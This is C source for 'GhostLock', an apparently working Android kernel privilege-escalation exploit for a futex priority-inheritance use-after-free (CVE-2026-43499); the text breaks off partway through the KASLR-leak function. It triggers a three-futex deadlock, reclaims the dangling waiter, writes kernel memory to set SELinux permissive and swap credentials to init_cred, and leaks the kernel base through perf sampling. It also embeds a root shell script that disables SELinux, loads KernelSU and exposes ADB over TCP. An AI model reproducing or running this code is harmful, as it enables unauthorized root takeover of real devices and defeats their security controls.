/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * Phase 1: Write 1 — SELinux permissive (child-node PI write)
 * Phase 2: Write 2 — cred = init_cred (child-node PI write via perf task leak)
 */

#include "common.h"
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>
#include <fcntl.h>
#include <dirent.h>
#include <stdlib.h>
#include "offsets.h"
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/perf_event.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/utsname.h>
#include <poll.h>

const struct kernel_offsets *active_offsets = NULL;

/* Override target.h _OFF macros with dynamic offsets from offsets.h table */
#undef SELINUX_ENFORCING_OFF
#undef INIT_CRED_OFF
#undef INIT_TASK_OFF
#undef INIT_UTS_NS_OFF
#undef EMPTY_ZERO_PAGE_OFF
#undef ROOT_TASK_GROUP_OFF
#undef KPTR_RESTRICT_OFF
#undef SELINUX_BLOB_SIZES_OFF
#undef SECURITY_HOOK_HEADS_OFF
#undef KMALLOC_CACHES_OFF
#undef ANON_PIPE_BUF_OPS_OFF
#undef ASHMEM_MISC_FOPS_OFF
#undef ASHMEM_FOPS_OFF
#undef ASHMEM_IOCTL_OFF
#undef ASHMEM_COMPAT_IOCTL_OFF
#undef ASHMEM_MMAP_OFF
#undef ASHMEM_OPEN_OFF
#undef ASHMEM_RELEASE_OFF
#undef ASHMEM_SHOW_FDINFO_OFF
#undef CONFIGFS_READ_ITER_OFF
#undef CONFIGFS_BIN_WRITE_ITER_OFF
#undef COPY_SPLICE_READ_OFF
#undef NOOP_LLSEEK_OFF
#undef CAP_CAPABLE_ACTIVE_OFF
#undef SLIDE_NFULNL_LOGGER_OFF
#undef SLIDE_LOGGERS_0_1_OFF
#undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
#undef SLIDE_SYSCTL_BOOTID_OFF

#define SELINUX_ENFORCING_OFF         active_offsets->off_selinux_enforcing
#define INIT_CRED_OFF                 active_offsets->off_init_cred
#define INIT_TASK_OFF                 active_offsets->off_init_task
#define INIT_UTS_NS_OFF               active_offsets->off_init_uts_ns
#define EMPTY_ZERO_PAGE_OFF           active_offsets->off_empty_zero_page
#define ROOT_TASK_GROUP_OFF           active_offsets->off_root_task_group
#define KPTR_RESTRICT_OFF             active_offsets->off_kptr_restrict
#define SELINUX_BLOB_SIZES_OFF        active_offsets->off_selinux_blob_sizes
#define SECURITY_HOOK_HEADS_OFF       active_offsets->off_security_hook_heads
#define KMALLOC_CACHES_OFF            active_offsets->off_kmalloc_caches
#define ANON_PIPE_BUF_OPS_OFF         active_offsets->off_anon_pipe_buf_ops
#define ASHMEM_MISC_FOPS_OFF          active_offsets->off_ashmem_misc_fops
#define ASHMEM_FOPS_OFF               active_offsets->off_ashmem_fops
#define ASHMEM_IOCTL_OFF              active_offsets->off_ashmem_ioctl
#define ASHMEM_COMPAT_IOCTL_OFF       active_offsets->off_ashmem_compat_ioctl
#define ASHMEM_MMAP_OFF               active_offsets->off_ashmem_mmap
#define ASHMEM_OPEN_OFF               active_offsets->off_ashmem_open
#define ASHMEM_RELEASE_OFF            active_offsets->off_ashmem_release
#define ASHMEM_SHOW_FDINFO_OFF        active_offsets->off_ashmem_show_fdinfo
#define CONFIGFS_READ_ITER_OFF        active_offsets->off_configfs_read_iter
#define CONFIGFS_BIN_WRITE_ITER_OFF   active_offsets->off_configfs_bin_write_iter
#define COPY_SPLICE_READ_OFF          active_offsets->off_copy_splice_read
#define NOOP_LLSEEK_OFF               active_offsets->off_noop_llseek
#define CAP_CAPABLE_ACTIVE_OFF        active_offsets->off_cap_capable_active
#define SLIDE_NFULNL_LOGGER_OFF       active_offsets->off_slide_nfulnl_logger
#define SLIDE_LOGGERS_0_1_OFF         active_offsets->off_slide_loggers_0_1
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF active_offsets->off_slide_boot_id
#define SLIDE_SYSCTL_BOOTID_OFF       active_offsets->off_slide_boot_id

/* Override struct field offsets (task_struct, etc.) with per-device values */
#include "runtime_struct_offsets.h"

static int select_offsets(void) {
  struct utsname uts;
  if (uname(&uts) < 0) return -1;
  pr_info("kernel: %s\n", uts.release);
  for (int i = 0; known_offsets[i].uname_r; i++) {
    if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
      active_offsets = &known_offsets[i];
      pr_success("offsets matched: %s\n", active_offsets->uname_r);
      /* Publish per-device symbol addresses that other TUs need. INIT_CRED
       * here expands via the redefined INIT_CRED_OFF above, i.e. the runtime
       * table entry rather than target.h's compile-time constant. */
      g_init_cred_image = INIT_CRED;
      if (active_offsets->kernel_phys_load) {
        p0_kernel_phys_load = active_offsets->kernel_phys_load;
      }
      pr_info("init_cred image=%016zx alias=%016zx\n",
              (size_t)g_init_cred_image, (size_t)data_addr(g_init_cred_image));
      return 0;
    }
  }
  pr_error("no offsets for kernel: %s\n", uts.release);
  pr_error("add this kernel to offsets.h and rebuild\n");
  return -1;
}

static struct timespec t0;
static void timer_reset(void) { clock_gettime(CLOCK_MONOTONIC, &t0); }

/* Durable stage marker: O_SYNC live_sync + stage paths (survives softboot). */
static void durable_stage(const char *stage) {
  live_sync_log("STAGE", stage);
  pr_info("STAGE %s\n", stage);
  fflush(stdout);
  fsync(STDOUT_FILENO);
}
static double timer_ms(void) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - t0.tv_sec) * 1000.0 + (now.tv_nsec - t0.tv_nsec) / 1e6;
}
#define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)

extern int pselect_custom_write;
extern uintptr_t pselect_custom_target;
extern uintptr_t pselect_custom_value;
extern int pselect_child_node;
void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode);
void clear_pselect_write(void);

/*
 * Futex words live in a FRESH anonymous mapping per route run. Fixed BSS
 * words made the second in-process run (MODE4_ROOT phase 2) reuse the
 * same hash buckets — still poisoned with phase-1 dangling waiters — and
 * the requeue walk crashed every time (R4/R6/R8). Old mappings stay
 * mapped so later mmaps get new VAs (different hb buckets).
 */
uint32_t *f_wait;
uint32_t *f_pi_target;
uint32_t *f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int owner_unlock_req;
atomic_int owner_unlock_done;
atomic_int requeue_done;
atomic_int route_done;
atomic_int waiter_tid;
/* Per-phase consumer nice: each walk must CHANGE the waiter task's prio,
 * or __sched_setscheduler returns early and rt_mutex_adjust_pi never runs. */
int consumer_nice = PSELECT_CONSUMER_NICE;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
int memfd_leak;

int selfstamp_prestage(void);
void selfstamp_route(void);

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);
  /*
   * GhostLock three-futex deadlock (IonStack / A53):
   *   waiter holds f_pi_chain, sleeps WAIT_REQUEUE_PI(f_wait→f_pi_target)
   *   owner holds f_pi_target, blocks on f_pi_chain
   *   CMP_REQUEUE_PI closes cycle → -EDEADLK → buggy remove_waiter leaves
   *   waiter->task->pi_blocked_on dangling at stack waiter for pselect reclaim.
   */
  if (futex_op(f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
    pr_error("waiter lock chain errno=%d\n", errno);
  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) usleep(1000);
  /*
   * MODE4_SELFSTAMP=1 (Quest3 architecture): pre-stage ALL fd setup
   * BEFORE the WRPI call; after the timeout returns, the waiter goes
   * straight into the continuous self-stamp loop — no logs, no sleeps,
   * no file I/O in the dangling-live-but-unstamped window.
   */
  int selfstamp = env_flag("MODE4_SELFSTAMP", 0);
  if (selfstamp && selfstamp_prestage() != 0)
    pr_error("SELFSTAMP prestage failed errno=%d\n", errno);

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;
  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wret = futex_op(f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                       f_pi_target, 0);
  int werr = errno;
  if (selfstamp) {
    /*
     * Quest3 "Step 3": UNLOCK f_pi_chain immediately after the timeout.
     * This releases the owner (blocked on the chain) and tears down the
     * blocked-chain relationship that lets kernel-side PI walks run
     * THROUGH our waiter task concurrently with the consumer's walk
     * (the second-walker crash source). The dangling pi_blocked_on
     * survives the unlock (Quest3-proven).
     */
    selfstamp_route(); /* chain unlock happens MID-STAMP inside (after
                        * the region is covered — the deboost walk then
                        * reads stamped words, not the raw residue) */
    durable_stage("waiter_pselect_returned");
    atomic_store(&route_done, 1);
    /* No tail unlock (its deboost walk = post-phase softboot) and NO
     * owner_chain_done wait: main returning exits the process, killing
     * every thread (the blocked owner included — futex exit cleanup
     * releases it) and the dangling dies with the waiter task. */
    return NULL;
  }
  pr_info("WAIT_REQUEUE_PI ret=%ld errno=%d (%s)\n", wret, werr,
          werr == EDEADLK ? "EDEADLK" :
          werr == ETIMEDOUT ? "ETIMEDOUT" :
          werr == EAGAIN ? "EAGAIN" :
          werr == EWOULDBLOCK ? "EWOULDBLOCK" : "other");
  /* A53: spin_until(deadlock_seen) after WAIT returns — requeue finished. */
  while (!atomic_load(&requeue_done))
    usleep(200);
  usleep(5000);
  durable_stage("waiter_after_requeue_enter_pselect");
  do_pselect_fake_lock_route();
  durable_stage("waiter_pselect_returned");
  atomic_store(&route_done, 1);
  futex_op(f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) usleep(1000);
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  long lock_target = futex_op(f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
  while (!atomic_load(&waiter_ready)) usleep(1000);
  /*
   * CRITICAL: take f_pi_chain BEFORE requeue so owner is blocked behind waiter.
   * MODE4_OWNER_UNLOCK=1 skips this and BREAKS the EDEADLK cycle (no UAF).
   * Default = always block on chain (GhostLock trigger).
   */
  if (env_flag("MODE4_OWNER_UNLOCK", 0)) {
    pr_info("owner MODE4_OWNER_UNLOCK=1 WARNING: skips chain block — "
            "NO three-futex EDEADLK / NO GhostLock UAF\n");
    atomic_store(&owner_started, 1);
    while (!atomic_load(&owner_unlock_req) && !atomic_load(&route_done))
      usleep(200);
    if (atomic_load(&owner_unlock_req)) {
      long ur = futex_op(f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
      atomic_store(&owner_unlock_done, 1);
      pr_info("owner UNLOCK f_pi_target ret=%ld errno=%d\n", ur, errno);
    }
  } else {
    atomic_store(&owner_started, 1);
    pr_info("owner blocking on f_pi_chain (deadlock stage for EDEADLK)\n");
  }
  futex_op(f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);
  for (;;) sleep(1);
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  int seen = 0;
  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) usleep((useconds_t)delay_usec);
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) break;
        atomic_fetch_add(&consumer_calls, 1);
        errno = 0;
        if (env_flag("MODE4_CFI_ON_PUNCH", 0) || env_flag("MODE4_PROOF", 0))
          durable_proof_log("pre_setattr");
        long sched_ret;
        if (env_flag("PUNCH_ALL_TIDS", 0)) {
          /* The EDEADLK can leave the dangling on ANY task of the process
           * (QEMU lldb-proven: a clone held it while the waiter's own field
           * was clean). sched_setattr EVERY tid; the holder gets walked. */
          sched_ret = 0;
          static int punch_dir_checked = 0;
          (void)punch_dir_checked;
          int df = open("/proc/self/task", O_RDONLY | O_DIRECTORY);
          if (df >= 0) {
            char dentbuf[4096];
            for (;;) {
              int dn = syscall(SYS_getdents64, df, dentbuf, sizeof(dentbuf));
              if (dn <= 0) break;
              for (int dp = 0; dp < dn;) {
                struct dirent64 *de = (void *)(dentbuf + dp);
                if (de->d_name[0] >= '0' && de->d_name[0] <= '9') {
                  int t2 = atoi(de->d_name);
                  if (t2 > 0 && t2 != (int)syscall(SYS_gettid)) {
                    errno = 0;
                    sched_ret |= sched_setattr_tid(t2, consumer_nice);
                  }
                }
                dp += de->d_reclen;
              }
            }
            close(df);
          } else {
            sched_ret = sched_setattr_tid(tid, consumer_nice);
          }
        } else {
          sched_ret = sched_setattr_tid(tid, consumer_nice);
        }
        pr_info("consumer punch tid=%d sched_ret=%ld errno=%d\n", tid,
                sched_ret, errno);
        if (env_flag("QEMU_INIT", 0)) {
          /* thread prints unreliable under QEMU TCG — durable file instead;
           * the launcher polls and prints it. */
          int pf = open("/data/local/tmp/punch",
                        O_WRONLY | O_CREAT | O_APPEND | O_SYNC, 0644);
          if (pf >= 0) {
            char pb[128];
            int pn = snprintf(pb, sizeof(pb),
                              "punch tid=%d ret=%ld errno=%d\n",
                              tid, sched_ret, errno);
            if (pn > 0)
              (void)write(pf, pb, (size_t)pn);
            close(pf);
          }
        }
        if (env_flag("MODE4_CFI_ON_PUNCH", 0) || env_flag("MODE4_PROOF", 0)) {
          char buf[80];
          snprintf(buf, sizeof(buf), "post_setattr ret=%ld errno=%d", sched_ret,
                   errno);
          durable_proof_log(buf);
        }
        /*
         * FUTEX_LOCK_PI fallback walks the PI chain while select holds the
         * UAF overlay — on CPH that races fake_lock.owner=fake_task and
         * softboots. Only use futex punch if MODE4_FUTEX_PUNCH=1.
         */
        if (sched_ret != 0 && env_flag("MODE4_FUTEX_PUNCH", 0)) {
          struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
          long fret = futex_op(f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
          if (fret == 0) {
            futex_op(f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            sched_ret = 0;
          }
        }
        /*
         * After setprio, optionally ask owner to UNLOCK f_pi_target so the
         * kernel PI unlock path can dequeue_pi the top waiter (UAF stamp).
         */
        if (env_flag("MODE4_OWNER_UNLOCK", 0)) {
          atomic_store(&owner_unlock_req, 1);
        }
        if (sched_ret == 0) {
          atomic_fetch_add(&consumer_success, 1);
          /*
           * MODE4_CFI_ON_PUNCH=1: probe ashmem write immediately after setprio
           * while select still holds the UAF overlay. EXP_O proved classic
           * MISC-8 parent survives select alone; softboot is punch/erase —
           * if rb_erase writes MISC then dies mid-walk, an early CFI probe
           * may catch fops redirect before reboot.
           */
          if (env_flag("MODE4_CFI_ON_PUNCH", 0) || env_flag("MODE4_PROOF", 0)) {
            durable_proof_log("cfi_on_punch_enter");
            int cfi_ok = try_cfi_stage();
            char buf[96];
            snprintf(buf, sizeof(buf),
                     "cfi_on_punch_done ok=%d step=%d errno=%d wr=%zd", cfi_ok,
                     cfi_last_step, cfi_last_errno, cfi_write_ret);
            durable_proof_log(buf);
          }
        }
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }
  return NULL;
}

void reset_main_route_state(void) {
  /* Fresh futex words per run: new VA => new hb bucket => no stale
   * waiters from a previous in-process route run. Mapping intentionally
   * leaked (never munmap'd) so the next mmap can't reuse this VA. */
  void *fw = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                  MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  if (fw == MAP_FAILED) {
    pr_error("route futex-word mmap failed errno=%d\n", errno);
    exit(1);
  }
  f_wait = (uint32_t *)fw;
  f_pi_target = (uint32_t *)fw + 1;
  f_pi_chain = (uint32_t *)fw + 2;
  atomic_store(&waiter_ready, 0); atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0); atomic_store(&owner_chain_done, 0);
  atomic_store(&owner_unlock_req, 0); atomic_store(&owner_unlock_done, 0);
  atomic_store(&requeue_done, 0);
  atomic_store(&route_done, 0); atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0); atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0); atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0; cfi_last_errno = 0;
}

void run_main_route_threads(void) {
  reset_main_route_state();
  durable_stage("route_threads_create");
  pthread_t waiter, owner, consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  /* Waiter sleeping on f_wait; owner has started and is (default) blocking
   * on f_pi_chain. Extra settle so owner is on the chain wait list. */
  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
    usleep(1000);
  usleep(80000);
  durable_stage("before_cmp_requeue_pi");
  errno = 0;
  long rret = futex_op(f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                       f_pi_target, 0);
  int rerr = errno;
  {
    int mf = open("/data/local/tmp/flow", O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (mf >= 0) {
      char mb[96];
      int mn = snprintf(mb, sizeof(mb), "main_cmp_done ret=%ld errno=%d", rret, rerr);
      if (mn > 0) (void)write(mf, mb, (size_t)mn);
      (void)write(mf, "\n", 1);
      close(mf);
    }
  }
  atomic_store(&requeue_done, 1);
  pr_info("CMP_REQUEUE_PI ret=%ld errno=%d (%s) — want EDEADLK(-35) for UAF\n",
          rret, rerr,
          rerr == EDEADLK ? "EDEADLK/UAF-primed" :
          rerr == 0 || rret >= 0 ? "ok/requeued(no-deadlock?)" : "other");
  durable_stage("after_cmp_requeue_pi");
  /* SP MEASUREMENT: while the waiter blocks in its 200ms measure-select,
   * read /proc/<tid>/syscall from THIS thread (its stdout prints work)
   * and dump the select-path kernel SP. */
  int measured = 0;
  while (!atomic_load(&route_done)) {
    if (!measured && atomic_load(&ss_measure_go)) {
      char pp[96], sb[256] = {0};
      snprintf(pp, sizeof(pp), "/proc/self/task/%d/syscall",
               (int)atomic_load(&waiter_tid));
      read_first_line(pp, sb, sizeof(sb));
      pr_success("QEMU_SELECT_SP=[%.200s]\n", sb);
      measured = 1;
    }
    usleep(5000);
  }
  durable_stage("route_done_observed");
  /* Stop the consumer so a later in-process walk (UID0 cred) does not
   * double-punch. Owner stays blocked; waiter has set route_done. */
  atomic_store(&punch_consume_stop, 1);
  pthread_join(consumer, NULL);
  pthread_detach(waiter);
  pthread_detach(owner);
}

static int do_one_write(uintptr_t target, const char *desc, int mode) {
  pr_info("=== %s === target=0x%016zx mode=%d\n", desc, target, mode);
  durable_stage("do_one_write_enter");
  pselect_child_node = 1;
  set_pselect_write_mode(target, 0, mode);
  /*
   * DATA-ONLY: no heap spray, no KS leak, no reclaim. The lock is a
   * static .data [0,0,0,1] pattern (QEMU-verified; default
   * init_task+0xAB8 via DATAONLY_LOCK image-offset env). The stack
   * stamp carries the whole write (see MODE4_DATAONLY in fops.c).
   */
  if (env_flag("MODE4_DATAONLY", 0)) {
    unsigned long lockoff = env_ulong("DATAONLY_LOCK", 0x27ccab8);
    fake_lock = data_addr(KIMAGE_TEXT_BASE + lockoff);
    pr_info("DATAONLY: lock=%016zx (image+%llx) target=%016zx val=0\n",
            fake_lock, (unsigned long long)lockoff, target);
    run_main_route_threads();
    clear_pselect_write();
    return 1;
  }
  TIMER("  heap spray start");
  durable_stage("spray_start");
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  if (!page_base) { pr_error("  heap spray failed\n"); clear_pselect_write(); return 0; }
  TIMER("  heap spray done");
  durable_stage("spray_done_before_route_threads");
  { int tf=open("/data/local/tmp/flow",O_WRONLY|O_CREAT|O_APPEND,0644);
    if(tf>=0){write(tf,"MAIN_BEFORE_THREADS'+BS+'n",19);close(tf);} }
  run_main_route_threads();
  durable_stage("route_threads_returned");
  { int tf=open("/data/local/tmp/flow",O_WRONLY|O_CREAT|O_APPEND,0644);
    if(tf>=0){write(tf,"MAIN_AFTER_THREADS'+BS+'n",18);close(tf);} }
  TIMER("  PI route done");
  clear_pselect_write();
  /*
   * mode4: the swap may have landed even on weak route signal (JC1 fire:
   * walk returned, no cfi markers, system softbooted AFTER process exit —
   * landed table hit by Android ashmem traffic with no restore). Run the
   * configfs stage unconditionally: verifies the primitive AND restores
   * ashmem_misc.fops to the original on success. Harmless errno-22 when
   * the swap missed.
   */
  if (mode == 4) {
    if (env_flag("MODE4_SWAP_NOCFI", 0)) {
      /* Bisect: swap lands, never open ashmem. Survives => our open is
       * the killer; dies => system traffic through the swapped table. */
      pr_info("mode4 SWAP_NOCFI: skipping cfi stage\n");
      durable_stage("swap_nocfi_done");
      if (env_flag("MODE4_SWAP_HOLD", 0)) {
        pr_info("SWAP_HOLD: spray live fake_fops=%016zx pid=%d — not exiting\n",
                fake_fops, getpid());
        durable_stage("swap_hold");
        fflush(stdout);
        fsync(STDOUT_FILENO);
        for (;;)
          sleep(30);
      }
      return 1;
    }
    pr_info("mode4 post-walk cfi stage (unconditional)\n");
    durable_proof_log("cfi_postwalk_enter");
    try_cfi_stage();
    durable_proof_log("cfi_postwalk_done");
    pr_info("mode4 cfi result step=%d errno=%d wr=%zd rd=%zd\n",
            cfi_last_step, cfi_last_errno, cfi_write_ret, cfi_read_ret);
  }
  return 1;
}

static int check_selinux_off(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
  if (efd < 0) return 1;
  char b[4] = {0};
  read(efd, b, sizeof(b));
  close(efd);
  return b[0] == '0';
}

static void slab_drain(void) {
  /* SKIP_DRAIN=1 for clean-boot matrix (fork storm can stress USB/adbd). */
  if (env_flag("SKIP_DRAIN", 0)) {
    pr_info("slab_drain skipped (SKIP_DRAIN=1)\n");
    return;
  }
  struct timespec up;
  clock_gettime(CLOCK_BOOTTIME, &up);
  int waves = (up.tv_sec > 60) ? 5 : 2;
  int batch = (up.tv_sec > 60) ? 400 : 200;
  /* LIGHT_DRAIN=1: minimal cleanup on clean boots */
  if (env_flag("LIGHT_DRAIN", 0)) {
    waves = 1;
    batch = 64;
  }
  for (int wave = 0; wave < waves; wave++) {
    pid_t *drain = calloc(batch, sizeof(pid_t));
    int n = 0;
    for (int i = 0; i < batch; i++) {
      drain[i] = fork();
      if (drain[i] == 0) { pause(); _exit(0); }
      if (drain[i] > 0) n++;
    }
    for (int i = 0; i < n; i++) {
      kill(drain[i], SIGKILL);
      waitpid(drain[i], NULL, 0);
    }
    free(drain);
    sched_yield();
  }
}

static void write_root_script(void) {
  int sfd = open("/data/local/tmp/.ghostlock_root.sh", O_WRONLY|O_CREAT|O_TRUNC, 0755);
  if (sfd < 0) return;
  const char *script =
    "#!/system/bin/sh\n"
    "echo '[+] root shell pid='$$ 'uid='$(id -u)\n"
    "mkdir -p /data/adb /data/adb/ksu /data/local/tmp 2>/dev/null\n"
    "id > /data/local/tmp/uid0_id.txt 2>/dev/null\n"
    "id > /sdcard/ghostlock/aarif/uid0_id.txt 2>/dev/null\n"
    "id > /data/adb/uid0_id.txt 2>/dev/null\n"
    "echo 0 > /sys/fs/selinux/enforce 2>/dev/null\n"
    "KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
    "if [ -z \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
    "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
    "  echo '[+] KernelSU already loaded'\n"
    "elif [ -x \"$KSUD\" ] || [ -f \"$KSUD\" ]; then\n"
    "  echo '[*] ksud:' $KSUD\n"
    "  chmod 755 \"$KSUD\" 2>/dev/null\n"
    "  KVER=$(uname -r | cut -d. -f1-2)\n"
    "  AVER=$(uname -r | grep -o 'android[0-9]*')\n"
    "  KMI=\"${AVER}-${KVER}\"\n"
    "  echo '[*] KMI=' $KMI\n"
    "  mkdir -p /data/adb/ksu 2>/dev/null\n"
    "  echo '[*] ksud late-load --kmi' $KMI\n"
    "  setsid \"$KSUD\" late-load --kmi \"$KMI\" </dev/null >/dev/null 2>&1 &\n"
    "  KSUD_PID=$!\n"
    "  echo '[*] ksud pid='$KSUD_PID\n"
    "  for w in $(seq 1 30); do\n"
    "    grep -q kernelsu /proc/modules 2>/dev/null && break\n"
    "    sleep 1\n"
    "  done\n"
    "  grep -q kernelsu /proc/modules 2>/dev/null && echo '[+] KSU LOADED' || echo '[!] KSU NOT loaded'\n"
    "  grep kernelsu /proc/modules && echo '[+] KSU loaded' || echo '[!] KSU NOT loaded'\n"
    "fi\n"
    "RSPROP=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
    "if [ -n \"$RSPROP\" ]; then\n"
    "  chmod 755 \"$RSPROP\" 2>/dev/null\n"
    "  ADB_PORT=$(cat /data/local/tmp/a/adb_port 2>/dev/null || echo 5555)\n"
    "  \"$RSPROP\" resetprop -p persist.adb.tcp.port $ADB_PORT 2>&1 && echo \"[+] persist.adb.tcp.port=$ADB_PORT set via resetprop\"\n"
    "  \"$RSPROP\" resetprop service.adb.tcp.port $ADB_PORT 2>/dev/null\n"
    "fi\n"
    "rm -f /data/local/tmp/.ghostlock_w1\n"
    "APK=$(pm path com.resukisu.resukisu 2>/dev/null | sed 's/package://')\n"
    "if [ -n \"$APK\" ] && [ -x /data/adb/ksud ]; then\n"
    "  /data/adb/ksud kernel dynamic-manager set-apk \"$APK\" 2>/dev/null && echo '[+] dynamic manager set'\n"
    "fi\n"
    "echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
    "echo '[*]' $(id) 'enforce='$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
    "echo '[+] done'\n"
    "if [ -t 0 ]; then exec /system/bin/sh -i; fi\n";
  write(sfd, script, strlen(script));
  close(sfd);
}

/*
 * G06/lagos-style KASLR: sample kernel IPs via perf, recover text base.
 * CPH2521 has perf_event_paranoid=-1 so this is allowed from shell.
 * Prefer 2MB-aligned vote; fall back to min_ip rounded down.
 */
static uint64_t perf_leak_text_base(int *out_samples, uint64_t *out_min_kip) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 1000;
  pe.sample_type = PERF_SAMPLE_IP;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;
  pe.exclude_kernel = 0;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) {
    /* pr_error() exits — do not use for optional probes */
    pr_info("perf text-base: perf_event_open failed errno=%d "
            "(SELinux/cap? paranoid may still allow)\n",
            errno);
    return 0;
  }
  size_t msz = 4096 * (1 + 64);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) {
    pr_info("perf text-base: mmap failed errno=%d\n", errno);
    close(fd);
    return 0;
  }
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 800000; i++)
    syscall(__NR_getpid);
  /* burn a bit more kernel time */
  for (int r = 0; r < 50; r++) {
    struct timespec ts = {0, 1000 * 1000};
    nanosleep(&ts, NULL);
    syscall(__NR_sched_yield);
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + hdr->data_offset;
  size_t dsz = hdr->data_size ? hdr->data_size : (4096ULL * 64);
  uint64_t pos = hdr->data_tail;
  uint64_t ips[512];
  int n = 0;
  uint64_t min_kip = ~(uint64_t)0;

  while (pos < head && n < 512) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size < sizeof(*ev))
      break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      uint64_t ip = *(uint64_t *)((char *)ev + sizeof(*ev));
      /* kernel VA windows seen on 5.10 Android (qualcomm + others) */
      int ok = 0;
      if (ip >= 0xffffffc000000000ULL && ip < 0xffffffe000000000ULL)
        ok = 1;
      if (ip >= 0xffffff8000000000ULL && ip < 0xffffffc000000000ULL)
        ok = 1;
      if (ip >= 0xffffff0000000000ULL && ip < 0xffffff8000000000ULL)
        ok = 1;
      if (ok) {
        ips[n++] = ip;
        if (ip < min_kip)
          min_kip = ip;
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head;
  munmap(buf, msz);
  close(fd);

  if (out_samples)
    *out_samples = n;
  if (out_min_kip)
    *out_min_kip = (n && min_kip != ~(uint64_t)0) ? min_kip : 0;
